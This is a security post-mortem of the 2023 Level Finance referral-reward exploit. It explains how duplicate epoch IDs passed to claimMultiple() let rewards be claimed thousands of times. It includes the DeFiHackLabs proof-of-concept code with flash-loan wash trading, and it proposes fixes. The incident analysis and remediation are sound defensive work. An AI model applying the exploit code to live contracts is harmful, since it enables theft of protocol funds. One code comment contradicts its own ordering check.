# Level Finance — Referral Reward Double-Claim Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2023-05-02 |
| **Protocol** | Level Finance |
| **Chain** | BSC (BNB Chain) |
| **Loss** | ~$1,000,000 (LVL tokens) |
| **Attacker** | [Attack EOA](https://bscscan.com/address/0x70319d1c09e1373fc7b10403c852909e5b20a9d5) |
| **Attack Tx 1** | [0x6aef8bb5...](https://bscscan.com/tx/0x6aef8bb501a53e290837d4398b34d5d4d881267512cfe78eb9ba7e59f41dad04) |
| **Attack Tx 2** | [0xe1f25704...](https://bscscan.com/tx/0xe1f257041872c075cbe6a1212827bc346df3def6d01a07914e4006ec43027165) |
| **Vulnerable Contract** | [LevelReferralControllerV2](https://bscscan.com/address/0x977087422C008233615b572fBC3F209Ed300063a) |
| **Root Cause** | Missing duplicate epoch ID validation in the `claimMultiple()` input array, allowing unlimited repeated claims of the same epoch's rewards |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-05/Level_exp.sol) |

---

## 1. Vulnerability Overview

Level Finance is a perpetual DEX protocol operating on BSC, where traders can earn LVL token rewards through a referral program.

### Core Vulnerability

The `claimMultiple()` function of the `LevelReferralControllerV2` contract is designed to claim rewards for multiple epochs in a single call. However, the function **does not validate duplicate elements in the input array**. By passing an array containing the same epoch ID repeated thousands of times, an attacker was able to claim one epoch's rewards thousands of times over.

### Attack Preconditions

1. Referral relationship registered (pre-configured via `setReferrer` call)
2. Sufficient trading volume generated (wash trading to accumulate reward points)
3. Epoch must have ended (after `nextEpoch`)
4. Pass an array with the same epoch ID duplicated en masse to `claimMultiple()`

---

## 2. Vulnerable Code Analysis

### 2.1 Missing Duplicate Claim Validation (Core Vulnerability)

Estimated implementation of the vulnerable `claimMultiple()` function:

```solidity
// ❌ Vulnerable code — no validation of duplicate epoch IDs in the array
function claimMultiple(uint256[] calldata _epoches, address _to) external {
    for (uint256 i = 0; i < _epoches.length; i++) {
        uint256 epoch = _epoches[i];
        uint256 claimableAmount = _claimable(epoch, msg.sender);
        
        // ❌ Issue: claimed[epoch][msg.sender] state is not updated, or
        //    the same epoch processed multiple times in the array passes without validation
        if (claimableAmount > 0) {
            _claim(epoch, _to, claimableAmount);
        }
        // ❌ The same epoch can be queried as claimable again on each iteration
    }
}
```

Fixed code:

```solidity
// ✅ Fixed code — prevents processing of duplicate epoch IDs
function claimMultiple(uint256[] calldata _epoches, address _to) external {
    // Use a bitmap or sort-based approach for duplicate detection
    uint256 lastEpoch = type(uint256).max;
    
    for (uint256 i = 0; i < _epoches.length; i++) {
        uint256 epoch = _epoches[i];
        
        // ✅ Sort-based deduplication: enforces strictly increasing order
        require(epoch < lastEpoch, "Duplicate or unordered epoch");
        lastEpoch = epoch;
        
        uint256 claimableAmount = _claimable(epoch, msg.sender);
        if (claimableAmount > 0) {
            _claim(epoch, _to, claimableAmount);
        }
    }
}
```

**Issue**: `claimMultiple()` iterates through the array and claims rewards for each epoch ID, but does not detect when the same epoch ID appears multiple times. Even if the internal `claim()` logic tracks claim state per epoch, duplicate processing of the same epoch within a single transaction bypasses this either because state updates are not immediately reflected or because the `claimable` lookup fails to read the updated state.

### 2.2 Reward Amplification via Referral Relationship Manipulation

```solidity
// ❌ Vulnerable structure — referral chain allowing self-referral
// this(ContractTest) → setReferrer(exploiter)
// exploiter → setReferrer(this)
// Result: two accounts mutually refer each other, accumulating bidirectional rewards

contract Exploiter {
    constructor(address _referrer) {
        // Register referral relationship: exploiter's referrer = this(ContractTest)
        LevelReferralControllerV2.setReferrer(_referrer);
    }
}
```

**Issue**: The referral program does not prevent self-referral or circular referral relationships, allowing the attacker to accumulate rewards on both accounts for artificially inflated trading volume generated via wash trading.

### 2.3 Point Accumulation via Wash Trading

```solidity
// ❌ Vulnerable structure — artificially accumulating points via flash loan + wash trading
function WashTrading() internal {
    // Flash loan 300 WBNB from DODO
    DVM(dodo).flashLoan(300 * 1e18, 0, address(this), abi.encode(uint256(20)));
}

function DPPFlashLoanCall(...) external {
    for (uint256 i; i < amount; i++) {
        // Repeat WBNB → USDT → WBNB wash trade 20 times
        // Each swap passes referrer address as extradata → points accumulated
        WBNB.transfer(address(pool), WBNB.balanceOf(address(this)));
        pool.swap(address(WBNB), address(USDT), 1, address(this), abi.encode(address(exploiter)));
        USDT.transfer(address(pool), USDT.balanceOf(address(this)));
        pool.swap(address(USDT), address(WBNB), 1, address(this), abi.encode(address(exploiter)));
    }
}
```

**Issue**: Referral points are accumulated for every swap that includes a referrer address, regardless of whether the swap participants are legitimate traders. There is no mechanism to prevent artificial volume generation via wash trading with flash-loaned funds.

---

## 3. Attack Flow

### 3.1 Preparation Phase

The attacker used 95 WBNB as initial capital, deployed an `Exploiter` contract, and configured referral relationships. They also established a referral network through 30 dummy `Referral` contracts to build a foundation for accumulating referral points.

### 3.2 Execution Phase

```
┌─────────────────────────────────────────────────────────┐
│                    Attacker (ContractTest)               │
└───────────────────────────┬─────────────────────────────┘
                            │
                            ▼
┌─────────────────────────────────────────────────────────┐
│  [Step 1] Referral Setup & Dummy Account Creation        │
│  - setReferrer(exploiter) : this → exploiter link       │
│  - 15 dummy accounts → registered under exploiter       │
│  - 15 dummy accounts → registered under this            │
└───────────────────────────┬─────────────────────────────┘
                            │
                            ▼
┌─────────────────────────────────────────────────────────┐
│  [Step 2] DODO Flash Loan + Wash Trading                 │
│  - Flash loan 300 WBNB from DODO DVM                    │
│  - WBNB ↔ USDT wash trades × 40 (20 per direction)      │
│  - Referrer address injected into each swap → points    │
│  - exploiter repeats the same pattern (20 times)        │
│  - 300 WBNB repaid                                      │
└───────────────────────────┬─────────────────────────────┘
                            │
                            ▼
┌─────────────────────────────────────────────────────────┐
│  [Step 3] Epoch End Trigger                              │
│  - Call setEnableNextEpoch(true) as admin address        │
│  - Call nextEpoch() → epoch finalized, reward snapshot  │
└───────────────────────────┬─────────────────────────────┘
                            │
                            ▼
┌─────────────────────────────────────────────────────────┐
│  [Step 4] Initial Legitimate Claim (single epoch)        │
│  - Call claim(epochId, address(this))                   │
│  - Call exploiter.claim(epochId)                        │
└───────────────────────────┬─────────────────────────────┘
                            │
                            ▼
┌─────────────────────────────────────────────────────────┐
│  [Step 5] Core Attack: claimMultiple duplicate claims   │
│           (repeated 11 times)                           │
│                                                         │
│  claimReward(2000) call:                                │
│  ┌───────────────────────────────────────────────────┐  │
│  │ epoches = [epochId, epochId, epochId, ... ×2000]  │  │
│  │ claimMultiple(epoches, address(this)) called      │  │
│  │ → Same epoch reward claimed 2000× over!           │  │
│  │ exploiter calls claimMultiple in the same manner  │  │
│  └───────────────────────────────────────────────────┘  │
│  × 11 iterations → 22,000 total duplicate claim        │
│    attempts                                             │
└───────────────────────────┬─────────────────────────────┘
                            │
                            ▼
┌─────────────────────────────────────────────────────────┐
│  [Result] Mass LVL token acquisition → sell → $1M profit│
└─────────────────────────────────────────────────────────┘
```

### 3.3 Outcome

- **Attacker profit**: ~$1,000,000 worth of LVL tokens
- **Protocol loss**: Massive depletion of the LVL token reward pool
- **Mechanism summary**: Accumulate points via wash trading → call `claimMultiple` with 2,000 duplicate epoch IDs × 11 iterations → drain tens of thousands of times the legitimate reward amount

---

## 4. PoC Code (DeFiHackLabs)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

// [Step 1] Referral relationship and dummy account setup
function setUp() public {
    cheats.createSelectFork("bsc", 27_830_139); // Fork before attack block
}

function testExploit() external {
    // Initial capital: 95 WBNB
    deal(address(WBNB), address(this), 95 * 1e18);
    
    // Deploy Exploiter contract (referral relationship auto-registered)
    exploiter = new Exploiter(address(this));
    
    // Referral chain: ContractTest → Exploiter
    LevelReferralControllerV2.setReferrer(address(exploiter));
    
    // [Step 2] Create 30 dummy referral accounts (build point accumulation base)
    createReferral();
    
    // [Step 3] Wash trading with 300 WBNB flash loan from DODO
    WashTrading();
    
    // [Step 4] Force epoch transition
    vm.warp(block.timestamp + 1 hours);
    vm.startPrank(0x6023C6afa26a68E05672F111FdbB1De93cBAc621);
    LevelReferralControllerV2.setEnableNextEpoch(true);
    LevelReferralControllerV2.nextEpoch(); // Epoch finalized
    vm.stopPrank();
    
    // [Step 5] Initial legitimate claim
    vm.warp(block.timestamp + 1 hours);
    claim();
    
    // [Core Attack] Pass 2000 duplicate epoch IDs to claimMultiple
    vm.warp(block.timestamp + 5 hours);
    for (uint256 i; i < 11; i++) {
        claimReward(2000); // Called with array of 2000 duplicate IDs
        vm.warp(block.timestamp + i * 15);
    }
}

// Core vulnerability exploitation function
function claimReward(uint256 amount) internal {
    uint256 tokenID = LevelReferralControllerV2.currentEpoch() - 1;
    
    // ❌ Exploit: insert the same epochId `amount` times
    uint256[] memory _epoches = new uint256[](amount);
    for (uint256 i; i < amount; i++) {
        _epoches[i] = tokenID; // Same tokenID repeated 2000 times
    }
    
    // claimMultiple processes all 2000 entries without duplicate validation
    LevelReferralControllerV2.claimMultiple(_epoches, address(this));
    exploiter.claimMultiple(amount); // Exploiter runs the same pattern
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE | Matching Pattern |
|----|--------|--------|-----|-----------|
| V-01 | claimMultiple array duplicate element not validated | CRITICAL | CWE-20 (Improper Input Validation) | `11_logic_error.md` (Pattern 2: Missing State Update) |
| V-02 | Referral self-referral / circular referral permitted | HIGH | CWE-284 (Improper Access Control) | `11_logic_error.md` (Pattern 3: Business Logic Error) |
| V-03 | No wash trading prevention mechanism | HIGH | CWE-693 (Protection Mechanism Failure) | `17_staking_reward.md` (Point Manipulation) |
| V-04 | Referral point snapshot integrity not validated | MEDIUM | CWE-362 (Race Condition) | `15_merkle_airdrop.md` (Double Claim) |

### V-01: claimMultiple Array Duplicate Element Not Validated (CRITICAL)

- **Description**: The `claimMultiple(uint256[] calldata _epoches, address _to)` function does not validate duplicate epoch IDs in the input array, causing rewards for the same epoch to be paid out as many times as the array length.
- **Impact**: An attacker can claim one epoch's rewards thousands to tens of thousands of times, completely draining the reward pool.
- **Attack Preconditions**: Referral relationship registered + `claimMultiple` callable after epoch end

### V-02: Referral Self-Referral / Circular Referral Permitted (HIGH)

- **Description**: The `setReferrer()` function does not prevent setting oneself as a referrer or forming circular referral chains (A→B, B→A).
- **Impact**: An attacker can set up mutual referrals between two accounts to accumulate rewards bidirectionally.
- **Attack Preconditions**: Two or more attacker-controlled addresses required

### V-03: No Wash Trading Prevention Mechanism (HIGH)

- **Description**: Referral points are automatically accumulated for every swap that includes a referrer address, with no validation that swap participants are distinct entities.
- **Impact**: Repeated wash trades using flash loan capital can artificially accumulate points at massive scale.
- **Attack Preconditions**: Sufficient capital available (flash loan usable)

### V-04: Referral Point Snapshot Integrity Not Validated (MEDIUM)

- **Description**: The referral point snapshot generated at epoch end locks in figures inflated by wash trading as-is.
- **Impact**: Manipulated points are reflected in actual reward calculations, causing the protocol to pay out excessive tokens.
- **Attack Preconditions**: V-03 must precede this

---

## 6. Remediation Recommendations

### Immediate Actions

**Add duplicate validation to claimMultiple (highest priority)**:

```solidity
// ✅ Method 1: Sort-based deduplication (gas-efficient)
function claimMultiple(uint256[] calldata _epoches, address _to) external {
    require(_epoches.length > 0, "Empty epochs array");
    
    uint256 prevEpoch = type(uint256).max;
    for (uint256 i = 0; i < _epoches.length; i++) {
        // Enforce strictly decreasing order to automatically block duplicates
        require(_epoches[i] < prevEpoch, "Duplicate or invalid epoch order");
        prevEpoch = _epoches[i];
        
        uint256 claimableAmount = _claimable(_epoches[i], msg.sender);
        if (claimableAmount > 0) {
            _claim(_epoches[i], _to, claimableAmount);
        }
    }
}

// ✅ Method 2: Track per-epoch duplicates with a claimed bitmap
mapping(address => mapping(uint256 => bool)) public hasClaimed;

function _claim(uint256 _epoch, address _to, uint256 amount) internal {
    require(!hasClaimed[msg.sender][_epoch], "Already claimed this epoch");
    hasClaimed[msg.sender][_epoch] = true;
    // ... actual token transfer logic
}
```

**Prevent circular referrals**:

```solidity
// ✅ Validate self-referral and reverse referral on registration
function setReferrer(address _referrer) external {
    require(_referrer != msg.sender, "Cannot refer yourself");
    require(referrers[_referrer] != msg.sender, "Circular referral detected");
    require(referrers[msg.sender] == address(0), "Referrer already set");
    referrers[msg.sender] = _referrer;
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01: Duplicate epoch claims | Manage claimed state per epoch using a Set/Bitmap inside the function; pre-filter duplicate epochs before calling claimMultiple |
| V-02: Circular referrals | Traverse the full referral chain on `setReferrer` to detect cycles; limit referral depth (e.g., maximum 5 levels) |
| V-03: Wash trading | Cap point accumulation for repeated swaps within the same block; introduce a cooldown period between swaps from the same participant |
| V-04: Point integrity | Auto-cap anomalous points (e.g., N× above average) at epoch finalization; set a maximum reward cap per epoch |

---

## 7. Lessons Learned

1. **Array inputs must always be validated for duplicates**: Functions that iterate over user-controlled arrays are vulnerable to replay attacks via duplicate elements. Uniqueness of input arrays must be strictly enforced, especially in monetary claim functions.

2. **The CEI (Checks-Effects-Interactions) principle must also apply within array loops**: When state updates and external calls (token transfers) are interleaved inside a loop, it must be verified that state updates are correctly read on the next iteration.

3. **Reward claim state must be managed atomically**: Track claim state with a nested mapping of the form `epoch → user → claimed`, and strictly enforce the order: check state before claiming → update state → transfer tokens.

4. **Referral programs are a Sybil attack vector**: Preventing Sybil attacks — where multiple accounts are created to artificially accumulate points — requires on-chain identity verification or a points-cap mechanism.

5. **Be wary of flash loan-based wash trading**: Wash trading using flash loans is one of the easiest ways to exploit volume-based reward systems. Limit point awards for direction-reversing swaps within the same transaction, or require a minimum holding period between swap participants.

6. **Bulk claim functions with array processing in epoch-based reward systems are the top priority for security audits**: Perpetual DEXes, staking protocols, and referral systems all tend to provide bulk claim functions that process epoch arrays. The duplicate-handling logic in these functions warrants intensive review.

---

## 8. On-Chain Verification

> On-chain verification is performed based on publicly available transaction data.

### 8.1 Attack Transaction Details

| Field | Value |
|------|----|
| Attack Tx 1 | [0x6aef8bb5...](https://bscscan.com/tx/0x6aef8bb501a53e290837d4398b34d5d4d881267512cfe78eb9ba7e59f41dad04) |
| Attack Tx 2 | [0xe1f25704...](https://bscscan.com/tx/0xe1f257041872c075cbe6a1212827bc346df3def6d01a07914e4006ec43027165) |
| Fork Block | 27,830,139 |
| Vulnerable Contract | 0x977087422C008233615b572fBC3F209Ed300063a |
| Flash Loan Provider | DODO DVM (0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d) |

### 8.2 Attack Flow Summary (On-Chain Event Sequence)

| Order | Event / Function | Target Contract |
|------|------------|--------------|
| 1 | setReferrer() | LevelReferralControllerV2 |
| 2 | Deploy 30 Referral contracts | — |
| 3 | flashLoan (300 WBNB) | DODO DVM |
| 4 | swap × 40 (WBNB↔USDT) | Level Pool |
| 5 | nextEpoch() | LevelReferralControllerV2 |
| 6 | claim() × 2 | LevelReferralControllerV2 |
| 7 | claimMultiple([epochId×2000]) × 22 | LevelReferralControllerV2 |
| 8 | Mass LVL token receipt | — |

### 8.3 Reference Analysis Links

- PeckShield analysis: https://twitter.com/peckshield/status/1653149493133729794
- BlockSec analysis: https://twitter.com/BlockSecTeam/status/1653267431127920641
- BscScan Tx 1: https://bscscan.com/tx/0x6aef8bb501a53e290837d4398b34d5d4d881267512cfe78eb9ba7e59f41dad04
- BscScan Tx 2: https://bscscan.com/tx/0xe1f257041872c075cbe6a1212827bc346df3def6d01a07914e4006ec43027165